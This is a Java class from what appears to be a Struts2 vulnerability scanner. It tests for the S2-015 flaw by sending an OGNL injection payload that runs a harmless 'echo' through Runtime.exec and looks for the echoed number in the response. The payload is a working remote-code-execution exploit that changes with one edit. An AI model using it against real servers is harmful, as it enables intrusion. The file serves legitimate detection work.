package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.net.URL;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_015 implements Check {
    public String printInfo(){
        String info = "[+] S2-015:影响版本Struts 2.0.0-2.3.14.2; GET请求发送数据";
        return info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception{

        int number = new Random(10000).nextInt(10000);
        String poc = "%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20"+number+"%27%29.getInputStream%28%29%29%2C%23q%7D.action";


        String url = protocol+"://"+host+":"+port+path+poc;

        try {
            HttpResult result= HttpClient.get(url);
            Pattern p = Pattern.compile(String.valueOf(number));
            Matcher m =p.matcher(result.getData());

            if(m.find()){
                return true;
            }else{
                return false;
            }
        }catch (Exception e){
            Pattern p = Pattern.compile(String.valueOf(number));
            Matcher m =p.matcher(e.toString());

            if(m.find()){
                return true;
            }else{
                return false;
            }
        }


        }



}
